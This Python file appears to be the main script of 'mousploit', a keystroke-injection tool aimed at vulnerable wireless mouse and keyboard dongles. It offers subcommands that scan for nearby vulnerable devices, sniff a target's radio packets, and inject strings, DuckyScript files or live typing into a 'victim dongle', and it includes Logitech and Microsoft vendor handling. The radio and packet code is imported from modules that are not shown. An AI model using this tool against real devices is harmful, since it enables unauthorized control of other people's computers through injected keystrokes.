import argparse
import sys
from os.path import dirname

sys.path.append(dirname(dirname(__file__)))
from main_app.radio_server import *
from radio_agent import nrf24
from utils.general_utils import *
from utils.script_parser import *
from utils.scan import *
from utils.sniff import *
from utils.live_mode import *
from utils.vendors import microsoft

NUM_RETRIES = 5 # number of allowed retries beyond which we give up finding the channel

"""
usage: mousploit.py [-h] {attack,scan,sniff} ...

options:
  -h, --help           show this help message and exit

required commands:
  {attack,scan,sniff}  Select one of:
    attack             Perform a keystroke injection attack against a specified target
    scan               Scan for nearby vulnerable devices
    sniff              Sniff packets from a specific device

commands usage:
usage: mousploit.py attack [-h] [--address ADDRESS] [--vendor VENDOR] (--string STRING | --script-file SCRIPT_FILE | --live-mode)
usage: mousploit.py scan [-h] [--duration DURATION]
usage: mousploit.py sniff [-h] [--address ADDRESS] [--duration DURATION]
"""
def main():
    # initializing the argument parser
    parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter)

    # adding two commands
    subparser = parser.add_subparsers(dest="command", title="required commands", help="Select one of:") # command can either be "attack", "scan" or "sniff"
    attack_cmd = subparser.add_parser("attack", help="Perform a keystroke injection attack against a specified target")
    scan_cmd = subparser.add_parser("scan", help="Scan for nearby vulnerable devices")
    sniff_cmd = subparser.add_parser("sniff", help="Sniff packets from a specific device")

    # defining arguments for "attack"
    attack_cmd.add_argument("--address", type=str, required=False, default="E4:ED:AE:B8:B4", help="RF address of a vulnerable device")
    attack_cmd.add_argument("--vendor", type=str, required=False, default="logitech", help="Vendor of vulnerable device")
    group = attack_cmd.add_mutually_exclusive_group(required=True) # either a string, a script file path or live mode must be specified, but only one of them
    group.add_argument("--string", type=str, help="A string of characters to be injected into the target") # if the string contains whitespaces, it must be surrounded with DOUBLE quotes
    group.add_argument("--script-file", type=str, help="Path of a DuckyScript file")
    group.add_argument("--live-mode", action="store_true", help="Listens to your keyboard and injects the keys you enter")
    
    # arguments for scan
    scan_cmd.add_argument("--duration", type=int, required=False, default=20, help="Duration of the scanning process (in seconds)")

    # arguments for sniff
    sniff_cmd.add_argument("--address", type=str, required=False, default="E4:ED:AE:B8:B4", help="RF address of a vulnerable device")
    sniff_cmd.add_argument("--duration", type=int, required=False, default=20, help="Duration of the sniffing process (in seconds)")

    parser.epilog = f"""commands usage:\n{attack_cmd.format_usage()}{scan_cmd.format_usage()}{sniff_cmd.format_usage()}""" # text added to the end of the help message (shown when using -h or calling parser.print_help())
    # parser.print_help()
    args = parser.parse_args() # parse the arguments

    # initialize the radio server
    radio_server = RadioServer("0.0.0.0", 5000) # 0.0.0.0 means listen on all network interfaces, this way we don't need to change the IP in this line every time we run the server on a different computer
    # radio_server = nrf24.nrf24() # if you want to run locally (comment out the previous line)

    if args.command == "attack":
        # We need to enter sniffer mode because this is the only way to tell the attacking dongle which address to use
        # when transmitting a payload. Note that this has nothing to do with sniffing keystrokes for keylogging purposes.
        radio_server.enter_sniffer_mode(address_str_to_bytes(args.address))

        # try to find the channel within the limited number of allowed retries
        found = False
        for i in range(NUM_RETRIES):
            if find_frequency_channel(radio_server):
                found = True
                break
        if not found:
            print("Failed to find frequency channel. Tell the agent to try getting closer to the victim dongle.")
            sys.exit(1)

        vendor = globals()[args.vendor] # globals() returns a dictionary containing all modules in the program, so given a vendor string we can get its module
        if vendor == microsoft:
            # Unlike Logitech for example, attacking Microsoft devices requires knowing their address beyond the call to enter_sniffer_mode above,
            # since it determines the packet structure (see microsoft.py). So we pass it to the microsoft module at this stage rather than
            # having to add a parameter to all attack functions below.
            microsoft.init(args.address)

        if args.string:
            print(f"Injecting the string: \"{args.string}\" into the target dongle paired to the device with address: {args.address}")
            transmit_string(radio_server, args.string, vendor)
        elif args.script_file:
            print(f"Injecting the DuckyScript at: {args.script_file} into the target dongle paired to the device with address: {args.address}")
            parse_script_file(radio_server, args.script_file, vendor)
        elif args.live_mode:
            print("Entered Live mode: Press any key to transmit it to the victim, press Esc to stop.")
            live_mode(radio_server, vendor)

    elif args.command == "scan":
        print(f"Scanning for {args.duration} seconds...")
        scan(radio_server, args.duration)

    elif args.command == "sniff":
        print(f"Sniffing packets from the target device with address: {args.address}")
        sniff(radio_server, address_str_to_bytes(args.address), args.duration)

if __name__ == "__main__":
    main()
